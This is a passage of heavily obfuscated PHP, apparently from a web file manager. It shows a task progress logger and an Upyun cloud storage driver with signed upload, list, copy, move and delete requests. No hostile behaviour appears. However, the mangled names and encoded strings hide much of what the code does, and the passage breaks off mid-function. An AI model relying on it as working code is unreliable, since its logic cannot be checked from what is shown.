$üúÄá =& $this->task; if ($Èšøéü­ > 0) { $üúÄá[$ÂÎ Á‰š[835]] = $üúÄá[$ÂÎ Á‰š[835]] == 0 ? $ûÀÔƒ¹ : $üúÄá[$ÂÎ Á‰š[835]]; $üúÄá[$ÂÎ Á‰š[1702]] = $Èšøéü­; } else { if ($¯Í¼ÒöÔ > 0) { $üúÄá[$ÂÎ Á‰š[835]] = $üúÄá[$ÂÎ Á‰š[835]] == 0 ? $Õ‰ÙŒŒ¿ : $üúÄá[$ÂÎ Á‰š[835]]; $üúÄá[$ÂÎ Á‰š[1702]] = $¯Í¼ÒöÔ; } } $this->update(); self::log("\x70\x72\x6f\x67\x72\145\163\163\110\x74\x74\160\x3a\144\157\167\156\x3a{$¯Í¼ÒöÔ}\57{$Õ‰ÙŒŒ¿}\x3b\x20\x75\x70\x6c\157\141\144\72{$Èšøéü­}\57{$ûÀÔƒ¹}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($»È©Ë³É, $ó¨ÜºÌÏ = '', $˜âÃ¿Ÿİ = 0, $¢ø¹ôÅ = '') { $“›ò œØ =& $_SERVER[çâ¥×ø³]; $–è–Ï® = new Task($»È©Ë³É, $ó¨ÜºÌÏ, $˜âÃ¿Ÿİ, $¢ø¹ôÅ); $GLOBALS[$“›ò œØ[1784] . $»È©Ë³É] = new TaskLog($“›ò œØ[1685], $–è–Ï®, $¢ø¹ôÅ); return $–è–Ï®; } public function __construct($äÕÃÚË = '', $õÅæ¥³« = '', $øšâ™ø = '') { $éÀ’ç§ =& $_SERVER[çâ¥×ø³]; if (!$äÕÃÚË) { $äÕÃÚË = $éÀ’ç§[1685]; } $íéãÀİ = $äÕÃÚË . $éÀ’ç§[430] . rand_string(10); if (!$øšâ™ø) { $øšâ™ø = $äÕÃÚË . $éÀ’ç§[53] . $øšâ™ø; } switch ($äÕÃÚË) { case $éÀ’ç§[1685]: if (!$õÅæ¥³« || !$õÅæ¥³«->task) { return echoLog($äÕÃÚË . $éÀ’ç§[1785]); } $ãøíùñ§ = $õÅæ¥³«; $íéãÀİ = $ãøíùñ§->task[$éÀ’ç§[443]]; $äÕÃÚË = $ãøíùñ§->task[$éÀ’ç§[443]]; if (!$ãøíùñ§->task[$éÀ’ç§[1598]]) { $ãøíùñ§->task[$éÀ’ç§[1598]] = $øšâ™ø ? $øšâ™ø : $äÕÃÚË; } break; case $éÀ’ç§[1786]: if (!$õÅæ¥³«) { return echoLog($äÕÃÚË . $éÀ’ç§[1787]); } $ì´ûÂ‘— = is_string($õÅæ¥³«) ? array($õÅæ¥³«) : $õÅæ¥³«; $ãøíùñ§ = new TaskFileTransfer($íéãÀİ, $äÕÃÚË, 0, $øšâ™ø ? $øšâ™ø : $ì´ûÂ‘—[0]); foreach ($ì´ûÂ‘— as $§Ï½äÊÊ) { $ãøíùñ§->addPath($§Ï½äÊÊ); } break; case $éÀ’ç§[357]: if (!$õÅæ¥³«) { return echoLog($äÕÃÚË . $éÀ’ç§[1787]); } $ì´ûÂ‘— = is_string($õÅæ¥³«) ? array($õÅæ¥³«) : $õÅæ¥³«; $ãøíùñ§ = new TaskZip($íéãÀİ, $äÕÃÚË, 0, $øšâ™ø ? $øšâ™ø : $ì´ûÂ‘—[0]); foreach ($ì´ûÂ‘— as $§Ï½äÊÊ) { $ãøíùñ§->addPath($§Ï½äÊÊ); } break; case $éÀ’ç§[1267]: if (!$õÅæ¥³«) { return echoLog($äÕÃÚË . $éÀ’ç§[1787]); } $ãøíùñ§ = new TaskUnZip($íéãÀİ, $äÕÃÚË, 0, $øšâ™ø ? $øšâ™ø : $õÅæ¥³«); if ($õÅæ¥³«) { $ãøíùñ§->addFile($õÅæ¥³«); } break; case $éÀ’ç§[149]: $ãøíùñ§ = new TaskHttp($íéãÀİ, $äÕÃÚË); break; default: return; break; } $this->task = $ãøíùñ§; $this->taskID = $íéãÀİ; Hook::bind($éÀ’ç§[1722], array($this, $éÀ’ç§[1788])); Hook::bind($éÀ’ç§[1724], array($this, $éÀ’ç§[1789])); Hook::bind($éÀ’ç§[1718], array($this, $éÀ’ç§[1790])); echoLog($éÀ’ç§[1791] . $ãøíùñ§->task[$éÀ’ç§[1598]]); } public function __destruct() { $this->end(); } public function end($×Í¹§´ = '') { $µÚÄƒ©ß =& $_SERVER[çâ¥×ø³]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($×Í¹§´); $this->task = !1; $this->taskID = !1; Hook::unbind($µÚÄƒ©ß[1722], array($this, $µÚÄƒ©ß[1788])); Hook::unbind($µÚÄƒ©ß[1724], array($this, $µÚÄƒ©ß[1789])); Hook::unbind($µÚÄƒ©ß[1718], array($this, $µÚÄƒ©ß[1790])); } public function taskUpdate($íÈêŠü) { $Éâî»¿ =& $_SERVER[çâ¥×ø³]; if (!$íÈêŠü || $this->taskID != $íÈêŠü[$Éâî»¿[443]]) { return; } $Ñµ®úèâ = 20; $•Áúö¿õ = intval($íÈêŠü[$Éâî»¿[1703]] * $Ñµ®úèâ); $âıÈßÀ = $Éâî»¿[163] . str_repeat($Éâî»¿[937], $•Áúö¿õ) . $Éâî»¿[1067] . str_repeat($Éâî»¿[53], $Ñµ®úèâ - $•Áúö¿õ) . $Éâî»¿[165]; $º¾÷ë›› = $âıÈßÀ . sprintf($Éâî»¿[1792], $íÈêŠü[$Éâî»¿[1703]] * 100) . $Éâî»¿[1793]; $õ¥‰ù†ê = $º¾÷ë›› . $íÈêŠü[$Éâî»¿[1702]] . $Éâî»¿[8] . $íÈêŠü[$Éâî»¿[835]] . LNG($Éâî»¿[1794]); $€¿ÂıøÀ = $Éâî»¿[12]; if ($íÈêŠü[$Éâî»¿[1778]]) { $õ¥‰ù†ê = $º¾÷ë›› . size_format($íÈêŠü[$Éâî»¿[1702]]) . $Éâî»¿[8] . size_format($íÈêŠü[$Éâî»¿[835]]); $€¿ÂıøÀ = size_format($íÈêŠü[$Éâî»¿[1704]]) . $Éâî»¿[1795]; } if ($íÈêŠü[$Éâî»¿[1117]]) { $íÈêŠü[$Éâî»¿[1752]] = $íÈêŠü[$Éâî»¿[1117]] . $Éâî»¿[53] . $íÈêŠü[$Éâî»¿[1752]]; } if ($íÈêŠü[$Éâî»¿[1752]]) { $—¯Ø…«… = $Éâî»¿[12]; if ($íÈêŠü[$Éâî»¿[1754]]) { $—¯Ø…«… = $Éâî»¿[50] . size_format($íÈêŠü[$Éâî»¿[1755]]) . $Éâî»¿[8] . size_format($íÈêŠü[$Éâî»¿[1754]]); } $€¿ÂıøÀ .= $íÈêŠü[$Éâî»¿[1752]] . $—¯Ø…«…; } if ($íÈêŠü[$Éâî»¿[812]] && !$íÈêŠü[$Éâî»¿[1754]]) { $€¿ÂıøÀ .= $Éâî»¿[53] . size_format($íÈêŠü[$Éâî»¿[1759]]) . $Éâî»¿[8] . size_format($íÈêŠü[$Éâî»¿[812]]); } echoLog($õ¥‰ù†ê . $Éâî»¿[53] . $€¿ÂıøÀ, !0); } public function taskEnd($¿ú“§ì¿) { $ªı³ôâ =& $_SERVER[çâ¥×ø³]; if (!$¿ú“§ì¿ || $this->taskID != $¿ú“§ì¿[$ªı³ôâ[443]]) { return; } $éÖÅ‡û = $¿ú“§ì¿ ? $¿ú“§ì¿[$ªı³ôâ[1702]] . $ªı³ôâ[8] . $¿ú“§ì¿[$ªı³ôâ[835]] . LNG($ªı³ôâ[1794]) . $ªı³ôâ[71] : $ªı³ôâ[12]; echoLog($ªı³ôâ[1796] . $¿ú“§ì¿[$ªı³ôâ[1598]] . ($¿ú“§ì¿[$ªı³ôâ[494]] ? $ªı³ôâ[71] . $¿ú“§ì¿[$ªı³ôâ[494]] : $ªı³ôâ[12]) . $ªı³ôâ[71] . $éÖÅ‡û . $ªı³ôâ[1797] . sprintf($ªı³ôâ[900], timeFloat() - $¿ú“§ì¿[$ªı³ôâ[1705]]) . $ªı³ôâ[1717]); $this->end(); } public function taskKill($ÇÄ‹ÎÒ) { $ÇáÖÕ¤ =& $_SERVER[çâ¥×ø³]; if (!$ÇÄ‹ÎÒ || $this->taskID != $ÇÄ‹ÎÒ[$ÇáÖÕ¤[443]]) { return; } echoLog($ÇáÖÕ¤[1798] . $ÇÄ‹ÎÒ[$ÇáÖÕ¤[1598]]); } } goto A¶Æ·°Ê”„; D ×²ÎÑ‘…: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\164\x70\72\x2f\57\x76\x30\x2e\x61\160\151\56\165\160\x79\x75\x6e\x2e\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Ù¶†¼¹) { parent::__construct(); $this->_init($Ù¶†¼¹); } public function _init($Ò¯ˆéû¡) { $ÊÌ—ï—– =& $_SERVER[çâ¥×ø³]; foreach ($Ò¯ˆéû¡ as $ªŞ—¼â‚ => $…ìˆé˜) { if (isset($this->{$ªŞ—¼â‚})) { $this->{$ªŞ—¼â‚} = $…ìˆé˜; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ÊÌ—ï—–[1493] . LNG($ÊÌ—ï—–[1422])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($¾ë¼ììÈ, $šÌ›µË• = "\x47\x45\124") { $ÄŒŸĞûƒ =& $_SERVER[çâ¥×ø³]; $¿â¤šÛ· = gmdate($ÄŒŸĞûƒ[1455]); $¿§ñœÁè = base64_encode(hash_hmac($ÄŒŸĞûƒ[1494], "{$šÌ›µË•}\46{$¾ë¼ììÈ}\x26{$¿â¤šÛ·}", md5("{$this->userpass}"), !0)); $Âé½Ü»ô = array("\x41\x75\x74\x68\157\x72\x69\x7a\x61\x74\x69\157\x6e\72\125\120\x59\125\116\40{$this->username}\x3a{$¿§ñœÁè}", "\104\141\164\145\x3a{$¿â¤šÛ·}"); return $Âé½Ü»ô; } public function ussRequest($³ëÛı, $ÇÜ¶é™½ = "\x47\x45\124", $¿‘‡ê¯¦ = false, $¦Ã‹Ö¥¨ = false, $æõ«¹–’ = false) { $ƒÖÈíâ¨ =& $_SERVER[çâ¥×ø³]; $³ëÛı = trim($³ëÛı, $ƒÖÈíâ¨[8]); $–üº€À = "\x2f{$this->bucket}\x2f{$³ëÛı}"; $ÒÚš¥¡ = $this->ussHeaders($–üº€À, $ÇÜ¶é™½); if ($¦Ã‹Ö¥¨) { $ÒÚš¥¡ = array_merge($ÒÚš¥¡, $¦Ã‹Ö¥¨); } $›‹£¦Œ½ = url_request($this->endpoint . $–üº€À, $ÇÜ¶é™½, $¿‘‡ê¯¦, $ÒÚš¥¡, $æõ«¹–’); if (!$›‹£¦Œ½) { return array($ƒÖÈíâ¨[1265] => !1, $ƒÖÈíâ¨[1255] => $ƒÖÈíâ¨[1495]); } if (strtolower($ÇÜ¶é™½) == $ƒÖÈíâ¨[211] || in_array($›‹£¦Œ½[$ƒÖÈíâ¨[1265]], array($ƒÖÈíâ¨[257], $ƒÖÈíâ¨[1496]))) { $¿‘‡ê¯¦ = $›‹£¦Œ½[$ƒÖÈíâ¨[1497]]; } else { $¿‘‡ê¯¦ = json_decode($›‹£¦Œ½[$ƒÖÈíâ¨[1255]], !0); if (!$¿‘‡ê¯¦) { $¿‘‡ê¯¦ = $›‹£¦Œ½[$ƒÖÈíâ¨[1255]]; } else { if (!$›‹£¦Œ½[$ƒÖÈíâ¨[799]] && isset($¿‘‡ê¯¦[$ƒÖÈíâ¨[1498]])) { $¿‘‡ê¯¦ = $¿‘‡ê¯¦[$ƒÖÈíâ¨[1498]]; } } } return array($ƒÖÈíâ¨[1265] => $›‹£¦Œ½[$ƒÖÈíâ¨[799]], $ƒÖÈíâ¨[1255] => $¿‘‡ê¯¦); } public function mkfile($öÙ˜Å, $¥²§¸ = '', $´µõ‹î = REPEAT_RENAME) { if ($this->setContent($öÙ˜Å, $¥²§¸)) { return $this->getPathOuter($öÙ˜Å); } return !1; } public function mkdir($²¥—Š—ã, $¨­Ùíçğ = REPEAT_SKIP) { $à¥Á”‘Õ =& $_SERVER[çâ¥×ø³]; $Â¨ï»Ã = trim($²¥—Š—ã, $à¥Á”‘Õ[8]); if ($this->_isFolder($Â¨ï»Ã)) { return $this->getPathOuter($Â¨ï»Ã); } $ä´ÊĞâ‡ = array($à¥Á”‘Õ[1499]); $ï‚Õş…ß = $this->ussRequest($Â¨ï»Ã, $à¥Á”‘Õ[241], !1, $ä´ÊĞâ‡); return $ï‚Õş…ß[$à¥Á”‘Õ[1265]] ? $this->getPathOuter($Â¨ï»Ã) : !1; } public function copyFile($ÑÊ¾¸„½, $Ïº›ĞÂ™) { $öëñ²¯» =& $_SERVER[çâ¥×ø³]; $¾óÇ Å = array($öëñ²¯»[1500] . "\x2f{$this->bucket}\x2f{$ÑÊ¾¸„½}", $öëñ²¯»[1501]); $°ßÚ±Ş = $this->ussRequest($Ïº›ĞÂ™, $öëñ²¯»[243], !1, $¾óÇ Å); return $°ßÚ±Ş[$öëñ²¯»[1265]] ? !0 : $this->getPathOuter($Ïº›ĞÂ™); } public function moveFile($¸³èÓû—, $™‰ŸØÎï) { $ôæ£â  =& $_SERVER[çâ¥×ø³]; $¹äâÅÚÛ = array($ôæ£â [1502] . "\x2f{$this->bucket}\x2f{$¸³èÓû—}", $ôæ£â [1501]); $®Ìµèâ… = $this->ussRequest($™‰ŸØÎï, $ôæ£â [243], !1, $¹äâÅÚÛ); return $®Ìµèâ…[$ôæ£â [1265]] ? !0 : $this->getPathOuter($™‰ŸØÎï); } public function delFile($û™£öğÚ) { $Şşƒ¼°ß =& $_SERVER[çâ¥×ø³]; $¶íÊ›ºß = $this->ussRequest($û™£öğÚ, $Şşƒ¼°ß[1503]); return $¶íÊ›ºß[$Şşƒ¼°ß[1265]] ? !0 : !1; } public function delFolder($¥î²üİ†) { $÷£‡ŒÍ =& $_SERVER[çâ¥×ø³]; if (!$this->exist($¥î²üİ†)) { return !0; } $this->listItemCache = !1; $§û„ù¾Æ = $´’Š»Æ‹ = array(); $this->fileList($¥î²üİ†, $§û„ù¾Æ, $´’Š»Æ‹, !0); $this->listItemCache = !0; foreach ($´’Š»Æ‹ as $¤Åê•®¤) { $»ÃÜş±İ = $this->ussRequest($¤Åê•®¤[$÷£‡ŒÍ[32]], $÷£‡ŒÍ[1503]); if (!$»ÃÜş±İ[$÷£‡ŒÍ[1265]]) { return !1; } } foreach ($§û„ù¾Æ as $Î˜¬ÄÎÑ) { $»ÃÜş±İ = $this->ussRequest($Î˜¬ÄÎÑ, $÷£‡ŒÍ[1503]); if (!$»ÃÜş±İ[$÷£‡ŒÍ[1265]]) { return !1; } } $»ÃÜş±İ = $this->ussRequest($¥î²üİ†, $÷£‡ŒÍ[1503]); return $»ÃÜş±İ[$÷£‡ŒÍ[1265]]; } public function rename($êÏÛÕ¸¯, $Ä¢ãØ¤Ã) { if ($this->isFile($êÏÛÕ¸¯)) { $Ä¢ãØ¤Ã = get_path_father($êÏÛÕ¸¯) . $Ä¢ãØ¤Ã; return $this->moveFile($êÏÛÕ¸¯, $Ä¢ãØ¤Ã); } return $this->renameObject($êÏÛÕ¸¯, $Ä¢ãØ¤Ã); } public function fileInfo($úÈÖ¨€†, $¡²—‘„ = false, $òâÍŸÏÀ = array()) { $Ş×âÉŞÛ =& $_SERVER[çâ¥×ø³]; $‡åË…Ø = array($Ş×âÉŞÛ[32] => $this->pathThis($úÈÖ¨€†), $Ş×âÉŞÛ[84] => $this->getPathOuter($Ş×âÉŞÛ[8] . $úÈÖ¨€†), $Ş×âÉŞÛ[33] => $Ş×âÉŞÛ[214], $Ş×âÉŞÛ[76] => isset($òâÍŸÏÀ[$Ş×âÉŞÛ[76]]) ? $òâÍŸÏÀ[$Ş×âÉŞÛ[76]] : 0, $Ş×âÉŞÛ[175] => $this->ext($úÈÖ¨€†)); if ($¡²—‘„) { return $‡åË…Ø; } $‡åË…Ø[$Ş×âÉŞÛ[215]] = $‡åË…Ø[$Ş×âÉŞÛ[85]] = 0; $‡åË…Ø[$Ş×âÉŞÛ[216]] = $‡åË…Ø[$Ş×âÉŞÛ[217]] = !0; if (empty($òâÍŸÏÀ)) { $òâÍŸÏÀ = $this->objectMeta($úÈÖ¨€†); if (!$òâÍŸÏÀ) { return $‡åË…Ø; } } $‡åË…Ø[$Ş×âÉŞÛ[215]] = intval($òâÍŸÏÀ[$Ş×âÉŞÛ[1504]]); $‡åË…Ø[$Ş×âÉŞÛ[85]] = intval($òâÍŸÏÀ[$Ş×âÉŞÛ[1505]]); $‡åË…Ø[$Ş×âÉŞÛ[76]] = $òâÍŸÏÀ[$Ş×âÉŞÛ[76]]; return $‡åË…Ø; } public function folderInfo($ÎóÇĞÓ¾, $ñÔ”œÖ = false) { $™°‘²ğ« =& $_SERVER[çâ¥×ø³]; $òöØ¬Ûş = array($™°‘²ğ«[32] => $this->pathThis($ÎóÇĞÓ¾), $™°‘²ğ«[84] => $this->getPathOuter($™°‘²ğ«[8] . $ÎóÇĞÓ¾), $™°‘²ğ«[33] => $™°‘²ğ«[75]); if ($ñÔ”œÖ) { return $òöØ¬Ûş; } $òöØ¬Ûş[$™°‘²ğ«[215]] = $òöØ¬Ûş[$™°‘²ğ«[85]] = 0; $òöØ¬Ûş[$™°‘²ğ«[216]] = $òöØ¬Ûş[$™°‘²ğ«[217]] = !0; if (empty($ˆõëÔ¸Ü)) { $ˆõëÔ¸Ü = $this->objectMeta($ÎóÇĞÓ¾); if (!$ˆõëÔ¸Ü) { return $òöØ¬Ûş; } } $òöØ¬Ûş[$™°‘²ğ«[215]] = intval($ˆõëÔ¸Ü[$™°‘²ğ«[1504]]); $òöØ¬Ûş[$™°‘²ğ«[85]] = intval($ˆõëÔ¸Ü[$™°‘²ğ«[1505]]); return $òöØ¬Ûş; } private function listObjs($íµÂº€, $Ù¯½ãĞø = 0, $ù¡†‚È = 1000) { $„º§›Ò =& $_SERVER[çâ¥×ø³]; $÷˜®¡ƒ¯ = array($„º§›Ò[1506], $„º§›Ò[1507] . $ù¡†‚È); if ($Ù¯½ãĞø) { $÷˜®¡ƒ¯[] = $„º§›Ò[1508] . $Ù¯½ãĞø; } $šñ„Å€ = $this->ussRequest($íµÂº€, $„º§›Ò[245], !1, $÷˜®¡ƒ¯); return !$šñ„Å€[$„º§›Ò[1265]] ? !1 : $šñ„Å€[$„º§›Ò[1255]]; } private function fileList($°·€ì€´, &$½‹Çîìå, &$§Í«ğÛ®, $½¨‘¢¶Á = false) { $ÈÙÒ¢³– =& $_SERVER[çâ¥×ø³]; $ˆÍì¢À = $ÈÙÒ¢³–[12]; $ºÆŒÕİŸ = 1000; $…ÈÄêÈÀ = rtrim($°·€ì€´, $ÈÙÒ¢³–[8]) . $ÈÙÒ¢³–[8]; while (!0) { check_abort(); $æŸ‡¯Õä = $this->listObjs($°·€ì€´, $ˆÍì¢À, $ºÆŒÕİŸ); if (!$æŸ‡¯Õä) { return !1; } $ˆÍì¢À = isset($æŸ‡¯Õä[$ÈÙÒ¢³–[1509]]) ? $æŸ‡¯Õä[$ÈÙÒ¢³–[1509]] : $ÈÙÒ¢³–[12]; $ØŠÚÍ· = isset($æŸ‡¯Õä[$ÈÙÒ¢³–[1510]]) ? $æŸ‡¯Õä[$ÈÙÒ¢³–[1510]] : array(); foreach ($ØŠÚÍ· as $µ³ş¼’÷) { $Ø¹ä«š = $µ³ş¼’÷[$ÈÙÒ¢³–[33]] == $ÈÙÒ¢³–[75] ? !0 : !1; $òƒ½«ş = ltrim($…ÈÄêÈÀ . $µ³ş¼’÷[$ÈÙÒ¢³–[32]], $ÈÙÒ¢³–[8]) . ($Ø¹ä«š ? $ÈÙÒ¢³–[8] : $ÈÙÒ¢³–[12]); $ÆŞÛû¥„ = array($ÈÙÒ¢³–[32] => $òƒ½«ş, $ÈÙÒ¢³–[33] => $Ø¹ä«š ? $ÈÙÒ¢³–[75] : $ÈÙÒ¢³–[214], $ÈÙÒ¢³–[76] => $µ³ş¼’÷[$ÈÙÒ¢³–[381]], $ÈÙÒ¢³–[1505] => $µ³ş¼’÷[$ÈÙÒ¢³–[1511]]); $this->cacheMethodInfoSet($òƒ½«ş, $Ø¹ä«š, $ÆŞÛû¥„); if ($Ø¹ä«š) { $½‹Çîìå[] = $òƒ½«ş; if ($½¨‘¢¶Á) { $this->fileList($òƒ½«ş, $½‹Çîìå, $§Í«ğÛ®, $½¨‘¢¶Á); } continue; } $§Í«ğÛ®[] = $ÆŞÛû¥„; } if (count($ØŠÚÍ·) < $ºÆŒÕİŸ) { break; } } $this->cacheMethodInfoSet($°·€ì€´, !0); } public function listPath($¹»Á¥ïü, $¸ĞÓğ¢ = false) { $½„·–½õ =& $_SERVER[çâ¥×ø³]; $ÆŞñÔ  = $üâñÜâ© = array(); $this->fileList($¹»Á¥ïü, $ÆŞñÔ , $üâñÜâ©); foreach ($ÆŞñÔ  as $¯„”ÊÇ® => $«ÜÂ¿Ÿ) { $ÆŞñÔ [$¯„”ÊÇ®] = $this->folderInfo($«ÜÂ¿Ÿ, $¸ĞÓğ¢); } foreach ($üâñÜâ© as $¯„”ÊÇ® => $«ÜÂ¿Ÿ) { $üâñÜâ©[$¯„”ÊÇ®] = $this->fileInfo($«ÜÂ¿Ÿ[$½„·–½õ[32]], $¸ĞÓğ¢, $«ÜÂ¿Ÿ); } return array($½„·–½õ[82] => $ÆŞñÔ , $½„·–½õ[83] => $üâñÜâ©); } public function has($›¼Î¹¦º, $¢¶û¢»¯ = false, $¥¨×¸ğ = true) { $Õ°Ã“üú =& $_SERVER[çâ¥×ø³]; $ÅÖÙ„ûÆ = $Õ°Ã“üú[12]; $¡Ä©õ°à = 500; $±Ûï×‘² = 0; $‘ññ…§‰ = 0; $±ä±¹¨’ = rtrim($›¼Î¹¦º, $Õ°Ã“üú[8]) . $Õ°Ã“üú[8]; while (!0) { check_abort(); $ÖÃœºÉ = $this->listObjs($›¼Î¹¦º, $ÅÖÙ„ûÆ, $¡Ä©õ°à); if (!$ÖÃœºÉ) { return !1; } $ÅÖÙ„ûÆ = isset($ÖÃœºÉ[$Õ°Ã“üú[1509]]) ? $ÖÃœºÉ[$Õ°Ã“üú[1509]] : $Õ°Ã“üú[12]; $ïÊ„»ÃÑ = isset($ÖÃœºÉ[$Õ°Ã“üú[1510]]) ? $ÖÃœºÉ[$Õ°Ã“üú[1510]] : array(); if (empty($ïÊ„»ÃÑ)) { break; } $Ø·£¸Ş„ = array_filter($ïÊ„»ÃÑ, function ($Â¡´«•) { $á ´ˆÈà =& $_SERVER[çâ¥×ø³]; return $Â¡´«•[$á ´ˆÈà[33]] == $á ´ˆÈà[75]; }); $ã î©áã = count($ïÊ„»ÃÑ); $Ø·£¸Ş„ = count($Ø·£¸Ş„); $ ğòØµƒ = $ã î©áã - $Ø·£¸Ş„; if ($¢¶û¢»¯) { $‘ññ…§‰ += $Ø·£¸Ş„; $±Ûï×‘² += $ ğòØµƒ; if ($ã î©áã < $¡Ä©õ°à) { break; } continue; } if ($¥¨×¸ğ) { if ($ ğòØµƒ) { return !0; } } else { if ($Ø·£¸Ş„) { return !0; } } if ($ã î©áã < $¡Ä©õ°à) { break; } } if ($¢¶û¢»¯) { return array($Õ°Ã“üú[223] => $±Ûï×‘², $Õ°Ã“üú[224] => $‘ññ…§‰); } return !1; } public function listAll($Å³°¢æ) { $Ô£Ëó =& $_SERVER[çâ¥×ø³]; $©€æÖ‹× = $Š¢ãş£ = array(); $this->fileList($Å³°¢æ, $©€æÖ‹×, $Š¢ãş£, !0); $„¬ä¦ÚÅ = array_to_keyvalue($Š¢ãş£, $Ô£Ëó[32]); foreach ($©€æÖ‹× as $öƒÏ‘¿§) { if (is_string($öƒÏ‘¿§)) { $„¬ä¦ÚÅ[$öƒÏ‘¿§] = array($Ô£Ëó[76] => 0); } } return $this->listAllFiles($Å³°¢æ, $„¬ä¦ÚÅ); } public function canRead($âìˆ€ş‰) { return $this->exist($âìˆ€ş‰) ? !0 : !1; } public function canWrite($ÎéÜ„åƒ) { return $this->exist($ÎéÜ„åƒ) ? !0 : !1; } public function getContent($®Õ±Åş­) { return $this->fileSubstr($®Õ±Åş­, 0, -1); } public function setContent($—ıòãùï, $æÕÚõ”² = '') { $çº¦±ùÁ =& $_SERVER[çâ¥×ø³]; if (!$æÕÚõ”²) { $À³ˆ¦¡Í = $this->ussRequest($—ıòãùï, $çº¦±ùÁ[241]); return $À³ˆ¦¡Í[$çº¦±ùÁ[1265]]; } $‘ÛáÆİƒ = $this->tempFile($this->pathThis($—ıòãùï)); file_put_contents($‘ÛáÆİƒ, $æÕÚõ”²); if ($this->upload($—ıòãùï, $‘ÛáÆİƒ)) { $this->tempFileRemve($‘ÛáÆİƒ); return !0; } return !1; } public function fileSubstr($ñ—ô»ò, $—¸¹º­Í, $ôü·ß¢Ô) { $„¯Ş‰¨ =& $_SERVER[çâ¥×ø³]; if (!($…ğ¢Ø˜Â = $this->link($ñ—ô»ò))) { return !1; } $Æ˜£­Ï = !1; if ($ôü·ß¢Ô > 0) { $¡Ë¬¢Â = $—¸¹º­Í + $ôü·ß¢Ô - 1; $Æ˜£­Ï = array($„¯Ş‰¨[1470] . $—¸¹º­Í . $„¯Ş‰¨[430] . $¡Ë¬¢Â); } $Ç–§Èå = url_request($…ğ¢Ø˜Â, $„¯Ş‰¨[245], !1, $Æ˜£­Ï); return $Ç–§Èå[$„¯Ş‰¨[799]] ? $Ç–§Èå[$„¯Ş‰¨[1255]] : !1; } public function upload($ÈúòİÅÙ, $Øè¹¢…Å, $»Œ†€„® = false, $„åÛ¨‡º = REPEAT_REPLACE) { $Ú›´÷õÚ =& $_SERVER[çâ¥×ø³]; $…àíë‰ = IO::size($Øè¹¢…Å); if ($…àíë‰ <= 1024 * 1024 * 200) { $ÈÎÒ“ = array($Ú›´÷õÚ[1512] . $Øè¹¢…Å); $ˆ¸¼º½ = $this->ussRequest($ÈúòİÅÙ, $Ú›´÷õÚ[243], $ÈÎÒ“); return $ˆ¸¼º½[$Ú›´÷õÚ[1265]] ? $this->getPathOuter($ÈúòİÅÙ) : !1; } $î÷«µŠÏ = 1024 * 1024 * 10; $ââ¡Î‘ç = array($Ú›´÷õÚ[1513], $Ú›´÷õÚ[1514] . $…àíë‰, $Ú›´÷õÚ[1515], $Ú›´÷õÚ[1516] . $î÷«µŠÏ); $ˆ¸¼º½ = $this->ussRequest($ÈúòİÅÙ, $Ú›´÷õÚ[243], !1, $ââ¡Î‘ç); if (!$ˆ¸¼º½[$Ú›´÷õÚ[1265]]) { return !1; } $ÁæâôöÃ = $ˆ¸¼º½[$Ú›´÷õÚ[1255]]; $¸˜ö¡åğ = 0; $Ç«àøÎÂ = $ÁæâôöÃ[$Ú›´÷õÚ[1517]]; $ë¿é™Ôò = fopen($Øè¹¢…Å, $Ú›´÷õÚ[1419]); if (!$ë¿é™Ôò) { return !1; } do { $¦—·Ä = $ÁæâôöÃ[$Ú›´÷õÚ[1518]]; fseek_64($ë¿é™Ôò, $¸˜ö¡åğ); $Ñ›ª„â = fread($ë¿é™Ôò, $¦—·Ä); $›²Œ¥°Ô = 0; do { $›²Œ¥°Ô++; $ÁæâôöÃ = $this->uploadPart($ÈúòİÅÙ, $ÁæâôöÃ, $Ñ›ª„â); } while (!$ÁæâôöÃ && $›²Œ¥°Ô < 3); if (!$ÁæâôöÃ) { return !1; } $Ç«àøÎÂ = $ÁæâôöÃ[$Ú›´÷õÚ[1517]]; $¸˜ö¡åğ += $¦—·Ä; } while ($Ç«àøÎÂ != -1); fclose($ë¿é™Ôò); $ââ¡Î‘ç = array($Ú›´÷õÚ[1519], $Ú›´÷õÚ[1520] . $ÁæâôöÃ[$Ú›´÷õÚ[1521]], $Ú›´÷õÚ[1515]); $ˆ¸¼º½ = $this->ussRequest($ÈúòİÅÙ, $Ú›´÷õÚ[243], !1, $ââ¡Î‘ç); return $ˆ¸¼º½[$Ú›´÷õÚ[1265]] ? $this->getPathOuter($‹¬Ö¨ç½) : !1; } private function uploadPart($Œá¿ÚÎ, $¹å¶ğæ—, &$ÍÉ‚çş) { $—ŒÍó¥ä =& $_SERVER[çâ¥×ø³]; $¾³Ñ™×­ = array($—ŒÍó¥ä[1522], $—ŒÍó¥ä[1520] . $¹å¶ğæ—[$—ŒÍó¥ä[1521]], $—ŒÍó¥ä[1523] . $¹å¶ğæ—[$—ŒÍó¥ä[1517]], $—ŒÍó¥ä[143] . $¹å¶ğæ—[$—ŒÍó¥ä[1518]]); $Ü‘ßµ† = $this->ussRequest($Œá¿ÚÎ, $—ŒÍó¥ä[243], $ÍÉ‚çş, $¾³Ñ™×­); return !$Ü‘ßµ†[$—ŒÍó¥ä[1265]] ? $Ü‘ßµ†[$—ŒÍó¥ä[1265]] : $Ü‘ßµ†[$—ŒÍó¥ä[1255]]; } public function uploadFormData($š®·Ù®„, $ÆèÈÓæ‡ = 3600) { return $this->uploadPolicy($š®·Ù®„, $ÆèÈÓæ‡); } public function multiUploadFormData($¥ÚÉô•, $›ˆª¿ì = 3600) { $»¨ò’¶£ =& $_SERVER[çâ¥×ø³]; $ŸÀƒÛİ¿ = (int) $GLOBALS[$»¨ò’¶£[7]][$»¨ò’¶£[76]]; return $this->uploadPolicy($¥ÚÉô•, $›ˆª¿ì, $ŸÀƒÛİ¿); } private function uploadPolicy($û†ÑÒŠí, $¹ê›Ì¦è = 3600, $ìÑŞªŞ = 0) { $ªàÃµ‚ =& $_SERVER[çâ¥×ø³]; $ìÃæÂÂ = $ªàÃµ‚[8] . $this->bucket; $ÎÔ‹€ö = gmdate($ªàÃµ‚[1455]); 